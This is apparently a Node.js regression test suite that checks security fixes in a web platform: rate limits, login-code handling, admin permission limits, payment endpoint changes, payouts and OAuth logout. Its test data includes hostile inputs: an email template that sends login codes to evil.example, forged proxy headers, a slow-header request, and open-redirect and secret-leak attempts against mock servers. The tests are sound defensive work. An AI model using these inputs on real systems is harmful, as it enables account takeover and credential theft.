'use strict';
/*
 * Regression tests for the security and integration fixes (findings CA-1..3, PT-1..4, IN-1..6 and the support-scope /
 * payment-endpoint items). Runs its own servers on free ports in 4801-4809 with temporary databases, plus local mock
 * providers. Called from test/smoke.js: require('./security-fixes')({ check }).
 */
const { spawn, spawnSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const net = require('node:net');
const { DatabaseSync } = require('node:sqlite');

const ROOT = path.join(__dirname, '..');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function portFree(p) {
  return new Promise((resolve) => { const s = net.createServer(); s.once('error', () => resolve(false)); s.listen(p, () => s.close(() => resolve(true))); });
}
async function freePorts(n) {
  const out = [];
  for (let p = 4801; p <= 4809 && out.length < n; p++) if (await portFree(p)) out.push(p);
  for (let p = 4810; out.length < n && p < 4900; p++) if (await portFree(p)) out.push(p); // all taken: fall back just above the range
  return out;
}

/* Runs a snippet in a fresh Node process with `env` and returns its JSON output (config is read once per process). */
function inFresh(code, env) {
  const r = spawnSync(process.execPath, ['--disable-warning=ExperimentalWarning', '-e', code], { cwd: ROOT, env: { ...process.env, TRUST_PROXY: '', RAILWAY_ENVIRONMENT: '', RAILWAY_PUBLIC_DOMAIN: '', DEV_LOGIN_CODES: '', BASE_URL: '', ...env }, encoding: 'utf8', timeout: 15000 });
  try { return JSON.parse(r.stdout.trim().split('\n').pop()); } catch { return { error: r.stderr || r.stdout }; }
}

function startServer(port, dir, env) {
  fs.mkdirSync(dir, { recursive: true });
  const srv = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', 'server.js'], {
    cwd: ROOT, stdio: ['ignore', 'pipe', 'pipe'],
    env: { ...process.env, PORT: String(port), DATABASE_PATH: path.join(dir, 'vs.db'), UPLOADS_DIR: path.join(dir, 'uploads'), BACKUPS_DIR: path.join(dir, 'backups'), VOICE_DIR: path.join(dir, 'voice'), SCHOOL_EXTRA_DIR: '', OWNER_EMAIL: 'owner@sec.test', NODE_ENV: 'test', EMAIL_PROVIDER: '', AFF_JOBS: 'off', AFFILIATE_URL: '', BASE_URL: '', RAILWAY_ENVIRONMENT: '', RAILWAY_PUBLIC_DOMAIN: '', DEV_LOGIN_CODES: '', ...env },
  });
  const st = { srv, log: '', code: null };
  srv.stdout.on('data', (d) => { st.log += d; }); srv.stderr.on('data', (d) => { st.log += d; });
  st.exited = new Promise((r) => srv.once('exit', (c) => { st.code = c; r(c); }));
  st.ready = (async () => {
    for (let i = 0; i < 150 && st.code === null; i++) { try { if ((await fetch(`http://127.0.0.1:${port}/healthz`)).ok) return true; } catch { /* starting */ } await sleep(100); }
    return false;
  })();
  st.stop = async () => { if (st.code === null) { srv.kill('SIGTERM'); await st.exited; } };
  return st;
}

/* A payout / payment provider stand-in: counts calls, remembers headers, optional delay and failure. */
function mockProvider() {
  const st = { calls: [], delay: 0, fail: false };
  const srv = http.createServer((req, res) => {
    let raw = ''; req.on('data', (c) => { raw += c; });
    req.on('end', async () => {
      st.calls.push({ method: req.method, url: req.url, headers: req.headers, body: raw });
      if (st.delay) await sleep(st.delay);
      if (st.fail) { res.writeHead(500, { 'content-type': 'application/json' }); return res.end('{"error":"down"}'); }
      res.writeHead(200, { 'content-type': 'application/json' });
      if (req.url.startsWith('/payouts')) return res.end(JSON.stringify({ id: 'prov_' + st.calls.length, status: 'pending' }));
      res.end('{"ok":true}');
    });
  });
  return new Promise((r) => srv.listen(0, '127.0.0.1', () => r({ st, srv, port: srv.address().port, close: () => new Promise((z) => srv.close(z)) })));
}

module.exports = async function securityFixes({ check }) {
  const DIR = fs.mkdtempSync(path.join(os.tmpdir(), `voosquare-secfix-${process.pid}-`));
  const [PORT, PORT2, PORT3] = await freePorts(3);
  const BASE = `http://127.0.0.1:${PORT}`;
  const HKEY = 'sec-health-key-123';

  class Client {
    constructor(base = BASE) { this.cookie = ''; this.base = base; }
    async req(method, p, body, headers = {}) {
      const h = { 'x-vs': '1', ...headers };
      if (this.cookie) h.cookie = this.cookie;
      const res = await fetch(this.base + p, { method, headers: { ...h, ...(body !== undefined ? { 'content-type': 'application/json' } : {}) }, body: body !== undefined ? JSON.stringify(body) : undefined, redirect: 'manual' });
      for (const c of (res.headers.getSetCookie ? res.headers.getSetCookie() : [])) if (c.startsWith('vs_sess=')) this.cookie = c.split(';')[0];
      const text = await res.text(); let data = null; try { data = JSON.parse(text); } catch { data = text; }
      return { status: res.status, data, headers: res.headers };
    }
    get(p, h) { return this.req('GET', p, undefined, h); }
    post(p, b, h) { return this.req('POST', p, b === undefined ? {} : b, h); }
    put(p, b) { return this.req('PUT', p, b); }
    patch(p, b) { return this.req('PATCH', p, b); }
    del(p) { return this.req('DELETE', p); }
    async login(email, name) { const s = await this.post('/api/auth/start', { email, name }); return this.post('/api/auth/verify', { email, code: s.data.dev_code }); }
  }

  console.log('Security fixes: configuration (PT-1, CA-1)');
  {
    const cfg = 'const c=require("./src/config");console.log(JSON.stringify({hops:c.trustProxy,dev:c.devLoginCodes,local:c.localBase}))';
    check('PT-1: X-Forwarded-For is not trusted by default', inFresh(cfg, {}).hops === 0);
    check('PT-1: on Railway exactly one proxy hop is trusted by default', inFresh(cfg, { RAILWAY_ENVIRONMENT: 'production' }).hops === 1);
    check('PT-1: TRUST_PROXY sets the number of trusted hops (and 0 turns it off on Railway)', inFresh(cfg, { TRUST_PROXY: '2' }).hops === 2 && inFresh(cfg, { TRUST_PROXY: '0', RAILWAY_ENVIRONMENT: 'production' }).hops === 0);
    const ip = inFresh(`const {clientIp}=require("./src/util");const r={headers:{"x-forwarded-for":"6.6.6.6, 10.0.0.1, 203.0.113.7"},socket:{remoteAddress:"127.0.0.1"}};console.log(JSON.stringify([clientIp(r,0),clientIp(r,1),clientIp(r,2),clientIp({headers:{},socket:{remoteAddress:"127.0.0.1"}},1)]))`, {});
    check('PT-1: the client is the n-th address from the right for n trusted hops; the socket address with none', JSON.stringify(ip) === JSON.stringify(['127.0.0.1', '203.0.113.7', '10.0.0.1', '127.0.0.1']), ip);
    check('CA-1: dev codes only for NODE_ENV=test or DEV_LOGIN_CODES=1 on a local address', inFresh(cfg, { NODE_ENV: 'test' }).dev === true && inFresh(cfg, { NODE_ENV: 'staging', DEV_LOGIN_CODES: '1', BASE_URL: 'http://app.localhost:3000' }).dev === true
      && inFresh(cfg, { NODE_ENV: 'staging' }).dev === false && inFresh(cfg, { NODE_ENV: 'development' }).dev === false && inFresh(cfg, { NODE_ENV: 'test', BASE_URL: 'https://voosquare.com' }).dev === false
      && inFresh(cfg, { NODE_ENV: 'test', RAILWAY_PUBLIC_DOMAIN: 'voosquare.up.railway.app' }).dev === false);
  }

  console.log('Security fixes: refuse to start (CA-1)');
  {
    const bad = startServer(PORT2, path.join(DIR, 'refuse'), { NODE_ENV: 'test', BASE_URL: 'https://voosquare.example' });
    const t = setTimeout(() => bad.srv.kill('SIGKILL'), 15000);
    await bad.exited; clearTimeout(t);
    check('CA-1: dev codes asked for on a public https address with no email: the app refuses to start with a clear log', bad.code === 1 && /REFUSING TO START/.test(bad.log), bad.log.slice(-400));
    const dev = startServer(PORT2, path.join(DIR, 'devmode'), { NODE_ENV: 'development' });
    const up = await dev.ready;
    const r = up ? await (await fetch(`http://127.0.0.1:${PORT2}/api/auth/start`, { method: 'POST', headers: { 'x-vs': '1', 'content-type': 'application/json' }, body: JSON.stringify({ email: 'owner@sec.test' }) })).json() : null;
    check('CA-1: NODE_ENV=development (not test, no DEV_LOGIN_CODES) never returns the login code, even for OWNER_EMAIL', up && r && r.ok === true && !('dev_code' in r) && r.existing === false, r);
    await dev.stop();
  }


  /* PT-3 on its own server with short timeouts (2 s) and small stream caps, so the rest is not timing-sensitive. */
  {
    const S3 = startServer(PORT3, path.join(DIR, 'streams'), { TRUST_PROXY: '0', STREAM_MAX_PER_IP: '3', STREAM_MAX_PER_USER: '2', REQUEST_TIMEOUT_MS: '2000' });
    const B3 = `http://127.0.0.1:${PORT3}`;
    try {
      check('stream test server boots', await S3.ready, S3.log.slice(-400));
      console.log('Security fixes: PT-3 live streams');
      {
        const opened = [];
        const open = async (cookie) => {
          const ctl = new AbortController();
          const r = await fetch(`${B3}/api/stream?ch=community`, { headers: cookie ? { cookie } : {}, signal: ctl.signal });
          const s = { status: r.status, ended: false, close: () => ctl.abort() };
          if (r.status === 200) { const rd = r.body.getReader(); s.done = (async () => { try { for (;;) { const { done } = await rd.read(); if (done) break; } } catch { /* aborted */ } s.ended = true; })(); opened.push(s); } else await r.text();
          return s;
        };
        const a1 = await open(); const a2 = await open(); const a3 = await open(); const a4 = await open();
        check('PT-3: open streams are capped per address (4th refused with 429)', a1.status === 200 && a2.status === 200 && a3.status === 200 && a4.status === 429, [a1.status, a2.status, a3.status, a4.status]);
        a3.close(); await sleep(150);
        const a5 = await open();
        check('PT-3: closing one frees a place', a5.status === 200, a5.status);
        a1.close(); a2.close(); a5.close(); await sleep(150);
        const mem = new Client(B3); await mem.login('streamer@sec.test', 'Stream Er');
        const u1 = await open(mem.cookie); const u2 = await open(mem.cookie); const u3 = await open(mem.cookie);
        check('PT-3: open streams are capped per member', u1.status === 200 && u2.status === 200 && u3.status === 429, [u1.status, u2.status, u3.status]);
        await sleep(3200);
        check('PT-3: a live stream stays open past the request timeout (2 s here)', !u1.ended && !u2.ended);
        u1.close(); u2.close();
        const slow = await new Promise((resolve) => {
          const sock = net.connect(PORT3, '127.0.0.1', () => sock.write('GET /api/site HTTP/1.1\r\nHost: x\r\nX-Slow: 1\r\n'));
          let got = ''; const t0 = Date.now();
          sock.on('data', (d) => { got += d; }); sock.on('close', () => resolve({ ms: Date.now() - t0, got })); sock.on('error', () => {});
          setTimeout(() => { sock.destroy(); resolve({ ms: -1, got }); }, 9000);
        });
        check('PT-3: a request whose headers never finish is cut off by the request timeout', slow.ms > 0 && slow.ms < 8000 && !/200 OK/.test(slow.got), slow);
        for (const s of opened) s.close();
      }
    } catch (e) {
      check('PT-3 checks ran without crashing', false, String(e && e.stack || e).slice(0, 400));
    } finally { await S3.stop(); }
  }

  const S = startServer(PORT, path.join(DIR, 'main'), { TRUST_PROXY: '0', HEALTH_KEY: HKEY });
  const mock = await mockProvider();
  const evil = await mockProvider();
  try {
    check('security server boots', await S.ready, S.log.slice(-500));
    const owner = new Client();
    const ov = await owner.login('owner@sec.test', 'Sec Owner');
    check('CA-1: test mode on localhost still signs in with the dev code', ov.status === 200 && ov.data.user.perms.includes('*'), ov.data);

    console.log('Security fixes: PT-4 /healthz');
    {
      const anon = await (await fetch(BASE + '/healthz')).json();
      check('PT-4: /healthz tells the public only { ok, time }', anon.ok === true && typeof anon.time === 'number' && Object.keys(anon).sort().join() === 'ok,time', anon);
      const keyed = await (await fetch(BASE + '/healthz', { headers: { 'x-health-key': HKEY } })).json();
      const wrong = await (await fetch(BASE + '/healthz', { headers: { 'x-health-key': 'nope' } })).json();
      const own = (await owner.get('/healthz')).data;
      check('PT-4: database and schema details with the health key or for an owner only', keyed.db === 'ok' && keyed.schema && keyed.schema.ok === true && !wrong.schema && own.schema && own.schema.ok === true, { keyed, wrong });
    }

    console.log('Security fixes: PT-1 rate limits');
    {
      const slug = (await new Client().get('/api/site')).data.products[0].slug;
      const codes = [];
      for (let i = 0; i < 23; i++) {
        const r = await fetch(`${BASE}/api/widget/${slug}/messages`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-forwarded-for': `9.9.${i}.9` }, body: JSON.stringify({ body: 'hi ' + i }) });
        codes.push(r.status);
      }
      check('PT-1: a new forged X-Forwarded-For per request does not reset the IP rate limit (no trusted proxy)', codes.slice(0, 20).every((c) => c === 200) && codes.slice(20).every((c) => c === 429), codes);
    }

    console.log('Security fixes: PT-2 sign-in does not reveal accounts');
    {
      await new Client().login('known@sec.test', 'Known Member');
      const a = (await new Client().post('/api/auth/start', { email: 'known@sec.test' })).data;
      const b = (await new Client().post('/api/auth/start', { email: 'ghost-404@sec.test' })).data;
      const strip = (x) => JSON.stringify({ ...x, dev_code: undefined });
      check('PT-2: /api/auth/start answers the same for an existing and an unknown email (existing is always false)', strip(a) === strip(b) && a.existing === false, [a, b]);
      const c = new Client();
      const s = await c.post('/api/auth/start', { email: 'newbie@sec.test' });
      const v1 = await c.post('/api/auth/verify', { email: 'newbie@sec.test', code: s.data.dev_code, ask_name: true });
      check('PT-2: a new email with no name gets need_name after a correct code (no account yet)', v1.status === 200 && v1.data.need_name === true && !v1.data.user, v1.data);
      const wrong = await new Client().post('/api/auth/verify', { email: 'ghost-404@sec.test', code: '000000', ask_name: true });
      check('PT-2: need_name is never answered for a wrong code', wrong.status === 400 && !wrong.data.need_name);
      const v2 = await c.post('/api/auth/verify', { email: 'newbie@sec.test', code: s.data.dev_code, name: 'Newbie Name', ask_name: true });
      check('PT-2: the same code then creates the account with the typed name', v2.status === 200 && v2.data.isNew === true && v2.data.user.name === 'Newbie Name', v2.data);
      const back = new Client(); const s2 = await back.post('/api/auth/start', { email: 'known@sec.test' });
      const v3 = await back.post('/api/auth/verify', { email: 'known@sec.test', code: s2.data.dev_code, ask_name: true });
      check('PT-2: a returning member with ask_name signs straight in', v3.status === 200 && v3.data.isNew === false && v3.data.user.name === 'Known Member');
      const ban = new Client(); const bv = await ban.login('banned@sec.test', 'Banned One');
      await owner.patch(`/api/admin/customers/${bv.data.user.id}`, { banned: true });
      const bs = await new Client().post('/api/auth/start', { email: 'banned@sec.test' });
      const bv2 = await new Client().post('/api/auth/verify', { email: 'banned@sec.test', code: bs.data.dev_code });
      check('PT-2: a suspended account gets the same start reply; verify (after the code) says it is suspended', bs.status === 200 && strip(bs.data) === strip(b) && bv2.status === 403, [bs.status, bv2.status]);
    }

    /* Products and staff for the permission checks. */
    const prodRes = await owner.get('/api/admin/products');
    if (!prodRes.data.products) throw new Error('products ' + prodRes.status + ' ' + JSON.stringify(prodRes.data).slice(0, 200));
    const prods = prodRes.data.products.filter((p) => !p.hub);
    const [PA, PB] = prods;
    const team = async (email, name, perms, scope) => { const r = await owner.post('/api/admin/team', { email, name, perms, ...(scope ? { support_scope: scope } : {}) }); const c = new Client(); await c.login(email, name); return { c, id: r.data.member && r.data.member.id, r }; };

    console.log('Security fixes: CA-3 delegated admins cannot reach owner power');
    {
      const T = await team('teamlead@sec.test', 'Team Lead', ['team', 'support']);
      const self = await T.c.post('/api/admin/team', { email: 'teamlead@sec.test', perms: ['team', 'support', 'settings'] });
      check('CA-3: a team admin cannot change their own permissions', self.status === 403, self.data);
      const more = await T.c.post('/api/admin/team', { email: 'friend@sec.test', name: 'Friend', perms: ['support', 'settings'] });
      check('CA-3: a team admin cannot give a permission they do not have', more.status === 403 && /settings/.test(more.data.error), more.data);
      const all = await T.c.post('/api/admin/team', { email: 'friend@sec.test', name: 'Friend', perms: ['customers', 'support', 'community', 'academy', 'blog', 'content', 'products', 'payments', 'emails', 'team', 'settings', 'aff_admin'] });
      const star = await T.c.post('/api/admin/team', { email: 'friend@sec.test', name: 'Friend', perms: ['*'] });
      check('CA-3: a team admin cannot hand out every permission or *', all.status === 403 && star.status === 403);
      const ok = await T.c.post('/api/admin/team', { email: 'friend@sec.test', name: 'Friend', perms: ['support'] });
      check('CA-3: a team admin can still give permissions they hold', ok.status === 200, ok.data);
      const S2 = await team('settingsman@sec.test', 'Settings Man', ['settings']);
      const edit = await T.c.post('/api/admin/team', { email: 'settingsman@sec.test', perms: ['support'] });
      const rm = await T.c.del(`/api/admin/team/${S2.id}`);
      const own = await T.c.post('/api/admin/team', { email: 'owner@sec.test', perms: ['support'] });
      check('CA-3: a team admin cannot edit or remove someone with permissions they lack, or an owner', edit.status === 403 && rm.status === 403 && own.status === 403, [edit.status, rm.status, own.status]);
      const T2 = await team('scopedlead@sec.test', 'Scoped Lead', ['team', 'support'], [PA.id]);
      const wide = await T2.c.post('/api/admin/team', { email: 'wide@sec.test', name: 'Wide', perms: ['support'], support_scope: ['*'] });
      const def = await T2.c.post('/api/admin/team', { email: 'narrow@sec.test', name: 'Narrow', perms: ['support'] });
      const narrowRow = (await owner.get('/api/admin/team')).data.team.find((m) => m.email === 'narrow@sec.test');
      check('CA-3: a scoped team admin cannot hand out a wider support scope (default is their own scope)', wide.status === 403 && def.status === 200 && JSON.stringify(narrowRow.support_scope) === JSON.stringify([PA.id]), [wide.data, narrowRow && narrowRow.support_scope]);

      const E = await team('emailer@sec.test', 'Email Er', ['emails']);
      const tpl = await E.c.put('/api/admin/emails/verify_code', { subject: 'Your code {{code}}', html: '<p>{{code}}</p><img src="https://evil.example/c?{{code}}">' });
      const tplReset = await E.c.post('/api/admin/emails/verify_code/reset');
      const other = await E.c.put('/api/admin/emails/welcome', { subject: 'Welcome {{firstName}}', html: '<p>Hi</p>' });
      const ownTpl = await owner.put('/api/admin/emails/verify_code', { subject: 'Your VooSquare code: {{code}}', html: '<p>Your code is {{code}}</p>' });
      check('CA-3: only an owner edits the login code email (emails staff can still edit other templates)', tpl.status === 403 && tplReset.status === 403 && other.status === 200 && ownTpl.status === 200, [tpl.status, tplReset.status, other.status, ownTpl.status]);
      const setEmail = await S2.c.put('/api/admin/settings/email', { value: { provider: 'resend', api_key: 're_attacker_key', from: 'x@evil.example' } });
      const getEmail = await S2.c.get('/api/admin/settings/email');
      check('CA-3: settings staff cannot change the email provider (it receives every login code); they can still read it', setEmail.status === 403 && getEmail.status === 200, [setEmail.status, getEmail.status]);

      const P = await team('producter@sec.test', 'Product Er', ['products']);
      const pv = (await P.c.get(`/api/admin/products/${PA.id}`)).data.product;
      const ov2 = (await owner.get(`/api/admin/products/${PA.id}`)).data.product;
      check('CA-3: client secrets and API keys are shown in full to owners only', /^••••/.test(pv.client_secret) && /^••••/.test(pv.api_key) && /^vss_/.test(ov2.client_secret) && /^vsk_/.test(ov2.api_key), [pv.client_secret, ov2.client_secret]);
      const rot = await P.c.post(`/api/admin/products/${PA.id}/rotate`, { which: 'secret' });
      check('CA-3: rotating as non-owner never returns the new secret', rot.status === 200 && /^••••/.test(rot.data.product.client_secret));
      const prodBody = (over) => ({ ...ov2, redirect_uris: ov2.redirect_uris, ...over });
      const moveP = await P.c.post('/api/admin/products', prodBody({ summary_url: `http://127.0.0.1:${evil.port}/summary` }));
      const moveO = await owner.post('/api/admin/products', prodBody({ summary_url: `http://127.0.0.1:${mock.port}/summary` }));
      const audit = (await owner.get('/api/admin/audit')).data.audit;
      check('CA-3: pointing a product summary URL / support webhook (they get the API key) at a new host is owner-only and audited', moveP.status === 403 && moveO.status === 200 && audit.some((x) => x.action === 'product.endpoint_change'), [moveP.status, moveO.status]);
    }

    console.log('Security fixes: payment-provider secrets never follow a changed endpoint');
    {
      const base = (port) => `http://127.0.0.1:${port}`;
      const created = await owner.post('/api/admin/payment-methods', { type: 'gatevoo', name: 'Gatevoo Sec', enabled: false, config: { api_base: base(mock.port), api_key: 'gk_secret_value', webhook_secret: 'whs_secret_value' } });
      const id = created.data.method && created.data.method.id;
      const PM = await team('payer@sec.test', 'Pay Er', ['payments']);
      const n0 = evil.st.calls.length;
      const staffMove = await PM.c.post('/api/admin/payment-methods', { id, type: 'gatevoo', name: 'Gatevoo Sec', enabled: false, config: { api_base: base(evil.port), api_key: '••••alue', webhook_secret: '••••alue' } });
      const staffTest = await PM.c.post('/api/admin/payment-methods/test', { id, type: 'gatevoo', config: { api_base: base(evil.port) } });
      check('payment endpoint: payments staff cannot point a method (or a test call) at a new host', staffMove.status === 403 && staffTest.status === 403 && evil.st.calls.length === n0, [staffMove.status, staffTest.status, evil.st.calls.length]);
      const ownerNoKey = await owner.post('/api/admin/payment-methods', { id, type: 'gatevoo', name: 'Gatevoo Sec', enabled: false, config: { api_base: base(evil.port), api_key: '••••alue', webhook_secret: '••••alue' } });
      const ownerTest = await owner.post('/api/admin/payment-methods/test', { id, type: 'gatevoo', config: { api_base: base(evil.port) } });
      check('payment endpoint: even an owner must type the secrets again for a new host (saved ones are never sent there)', ownerNoKey.status === 400 && Array.isArray(ownerNoKey.data.reenter) && ownerNoKey.data.reenter.includes('api_key') && ownerTest.status === 400 && !evil.st.calls.some((c) => /gk_secret_value/.test(c.headers.authorization || '')), [ownerNoKey.data, ownerTest.status]);
      const ownerKey = await owner.post('/api/admin/payment-methods', { id, type: 'gatevoo', name: 'Gatevoo Sec', enabled: false, config: { api_base: base(evil.port), api_key: 'gk_new_value', webhook_secret: 'whs_new_value' } });
      const same = await PM.c.post('/api/admin/payment-methods', { id, type: 'gatevoo', name: 'Gatevoo Sec renamed', enabled: false, config: { api_base: base(evil.port), api_key: '••••alue', webhook_secret: '••••alue' } });
      const audit = (await owner.get('/api/admin/audit')).data.audit;
      check('payment endpoint: the owner with re-entered secrets may move it (audited); same-host edits stay open to payments staff', ownerKey.status === 200 && same.status === 200 && audit.some((x) => x.action === 'payment_method.endpoint_change'), [ownerKey.status, same.status]);
    }

    console.log('Security fixes: support scope');
    {
      const G = await team('agent-a@sec.test', 'Agent A', ['support'], [PA.id]);
      const victim = new Client(); const vv = await victim.login('victim@sec.test', 'Victim Member');
      const tB = (await victim.post('/api/support/tickets', { product_id: PB.id, subject: 'Private B matter', body: 'Secret about product B' })).data.ticket;
      // An in-scope conversation that only carries the victim's email (as a widget visitor or a tool could type it).
      const keyA = (await owner.get(`/api/admin/products/${PA.id}`)).data.product.api_key;
      await fetch(`${BASE}/api/v1/support/messages`, { method: 'POST', headers: { authorization: 'Bearer ' + keyA, 'content-type': 'application/json' }, body: JSON.stringify({ body: 'hello from A', email: 'victim@sec.test' }) });
      const cust = await G.c.get(`/api/admin/customers/${vv.data.user.id}`);
      check('support scope: an agent sees only in-scope conversations on a customer page (a widget email cannot open the rest)', cust.status === 200 && cust.data.tickets.length >= 1 && cust.data.tickets.every((t) => t.product_id === PA.id) && !cust.data.tickets.some((t) => t.id === tB.id), cust.data.tickets && cust.data.tickets.map((t) => t.product_id));
      const read = await G.c.get(`/api/admin/tickets/${tB.id}`);
      const reply = await G.c.post(`/api/admin/tickets/${tB.id}/reply`, { body: 'peek' });
      const patch = await G.c.patch(`/api/admin/tickets/${tB.id}`, { status: 'closed' });
      const list = (await G.c.get('/api/admin/tickets?status=all')).data.tickets;
      check('support scope: an out-of-scope ticket cannot be read, answered, changed or listed', read.status === 404 && reply.status === 404 && patch.status === 404 && !list.some((t) => t.id === tB.id), [read.status, reply.status, patch.status]);
    }

    console.log('Security fixes: CA-2 provider payouts send once');
    {
      const sql = new DatabaseSync(path.join(DIR, 'main', 'vs.db'));
      const aff = new Client(); const av = await aff.login('affiliate@sec.test', 'Aff Iliate');
      const aff2 = new Client(); const av2 = await aff2.login('affiliate2@sec.test', 'Aff Two');
      const mkAff = (uid, code) => { sql.prepare("INSERT INTO aff_affiliates(user_id, code, status, approved_at) VALUES(?,?,?,?)").run(uid, code, 'approved', Date.now()); return sql.prepare('SELECT id FROM aff_affiliates WHERE user_id=?').get(uid).id; };
      const affIds = [mkAff(av.data.user.id, 'secaff1'), mkAff(av2.data.user.id, 'secaff2')];
      const mkPayout = (affId) => Number(sql.prepare("INSERT INTO aff_payouts(affiliate_id, amount_cents, fee_cents, method, wallet, status, requested_at) VALUES(?,?,?,?,?,?,?)").run(affId, 20000, 0, 'usdt_trc20', 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE', 'requested', Date.now()).lastInsertRowid);
      const AA = await team('affadmin@sec.test', 'Aff Admin', ['aff_admin']);
      const provBody = (base, key) => ({ payouts: { provider: { kind: 'http', name: 'Mock', api_base: base, ...(key ? { api_key: key } : {}) } } });
      const first = await owner.put('/api/admin/aff/settings', provBody(`http://127.0.0.1:${mock.port}`, 'pk_secret'));
      check('CA-2 setup: the owner connects an HTTP payout provider', first.status === 200, first.data);
      const p1 = mkPayout(affIds[0]);
      mock.st.calls.length = 0; mock.st.delay = 800;
      const res = await Promise.all([1, 2, 3].map(() => owner.post(`/api/admin/aff/payouts/${p1}/processing`)));
      const posts = mock.st.calls.filter((c) => c.method === 'POST' && c.url === '/payouts');
      const codes = res.map((r) => r.status).sort();
      check('CA-2: three parallel "Mark sending" clicks call the provider once (1 × 200, 2 × 409)', JSON.stringify(codes) === '[200,409,409]' && posts.length === 1, [codes, posts.length]);
      check('CA-2: the provider gets an Idempotency-Key for the payout', posts[0] && posts[0].headers['idempotency-key'] === `vsa-payout-${p1}`, posts[0] && posts[0].headers);
      const row = sql.prepare('SELECT status, provider_ref FROM aff_payouts WHERE id=?').get(p1);
      check('CA-2: the payout is sending with the provider reference', row.status === 'processing' && /^prov_/.test(row.provider_ref), row);
      const p2 = mkPayout(affIds[1]); mock.st.delay = 0; mock.st.fail = true;
      const failed = await owner.post(`/api/admin/aff/payouts/${p2}/processing`);
      const row2 = sql.prepare('SELECT status, provider_status FROM aff_payouts WHERE id=?').get(p2);
      check('CA-2: a refused provider call puts the payout back (can be sent again)', failed.status === 502 && row2.status === 'requested' && row2.provider_status === '', [failed.status, row2]);
      mock.st.fail = false;
      const n0 = evil.st.calls.length;
      const aaMove = await AA.c.put('/api/admin/aff/settings', provBody(`http://127.0.0.1:${evil.port}`));
      const ownNoKey = await owner.put('/api/admin/aff/settings', provBody(`http://127.0.0.1:${evil.port}`));
      const ownKey = await owner.put('/api/admin/aff/settings', provBody(`http://127.0.0.1:${evil.port}`, 'pk_new'));
      check('payout provider endpoint: owner-only, and the API key must be typed again for a new host', aaMove.status === 403 && ownNoKey.status === 400 && ownKey.status === 200 && evil.st.calls.length === n0, [aaMove.status, ownNoKey.status, ownKey.status]);
      sql.close();
    }

    console.log('Security fixes: Events API (IN-2, IN-3, IN-4)');
    {
      const key = (await owner.get(`/api/admin/products/${PB.id}`)).data.product.api_key;
      const ev = async (body) => (await fetch(BASE + '/api/v1/events', { method: 'POST', headers: { authorization: 'Bearer ' + key, 'content-type': 'application/json' }, body: JSON.stringify(body) })).json();
      const long = 'jv_use_2026-10-05_' + 'x'.repeat(62);
      const r1 = await ev({ events: [{ event_id: long + 'A1', type: 'lead' }, { event_id: long + 'B2', type: 'lead' }, { event_id: 'short_ok_1', type: 'lead' }] });
      check('IN-2: event_id over 80 characters is rejected with a reason, never truncated into a duplicate', r1.stored === 1 && r1.rejected && r1.rejected.length === 2 && r1.rejected.every((x) => /80 characters/.test(x.error)) && r1.rejected[0].event_id === long + 'A1', r1);
      const r2 = await ev({ events: [{ type: 'spend', value_usd: 5 }, { type: 'refund', value_usd: -5 }, { type: 'login' }] });
      check('IN-3: money events without event_id are rejected (other types still get an id)', r2.stored === 1 && r2.rejected && r2.rejected.length === 2 && r2.rejected.every((x) => /event_id is required/.test(x.error)), r2);
      const r3 = await ev({ events: [null, 'str', 5, [1], {}] });
      check('IN-4: malformed entries are listed in rejected, not dropped silently', r3.ok === true && r3.stored === 0 && r3.rejected && r3.rejected.length === 5 && r3.rejected.slice(0, 4).every((x) => x.event_id === '' && /must be an object/.test(x.error)), r3);
    }

    console.log('Security fixes: OAuth logout (IN-1, IN-5)');
    {
      const p = (await owner.post('/api/admin/products', { name: 'Repro Tool', slug: 'repro-tool', url: 'https://repro.example', sso: true, redirect_uris: ['https://repro.example/auth/voosquare/callback'], visible: false })).data.product;
      const lo = async (to, cookie) => (await fetch(`${BASE}/oauth/logout?redirect_uri=${encodeURIComponent(to)}`, { redirect: 'manual', headers: cookie ? { cookie } : {} })).headers.get('location');
      check('IN-1: log out returns to any page on the product site (its URL origin), not only registered redirect URIs', await lo('https://repro.example/') === 'https://repro.example/' && await lo('https://repro.example') === 'https://repro.example');
      check('IN-1: log out still refuses other sites', await lo('https://evil.example/') === '/' && await lo('https://repro.example.evil.example/') === '/');
      const m = new Client(); await m.login('tooluser@sec.test', 'Tool User');
      const auth = await fetch(`${BASE}/oauth/authorize?client_id=${p.client_id}&redirect_uri=${encodeURIComponent('https://repro.example/auth/voosquare/callback')}&state=s1`, { redirect: 'manual', headers: { cookie: m.cookie } });
      const code = new URL(auth.headers.get('location')).searchParams.get('code');
      const tok = await (await fetch(`${BASE}/oauth/token`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ grant_type: 'authorization_code', code, redirect_uri: 'https://repro.example/auth/voosquare/callback', client_id: p.client_id, client_secret: p.client_secret }) })).json();
      const ui = (t) => fetch(`${BASE}/oauth/userinfo`, { headers: { authorization: 'Bearer ' + t } }).then((r) => r.status);
      const before = await ui(tok.access_token);
      await lo('https://repro.example/', m.cookie);
      const after = await ui(tok.access_token);
      check('IN-5: "Log out everywhere" revokes tool access tokens issued before it', before === 200 && after === 401, [before, after]);
    }
  } catch (e) {
    check('security fixes ran without crashing', false, String(e && e.stack || e).slice(0, 600));
  } finally {
    await S.stop();
    await mock.close(); await evil.close();
    try { fs.rmSync(DIR, { recursive: true, force: true }); } catch { /* ignore */ }
  }
};
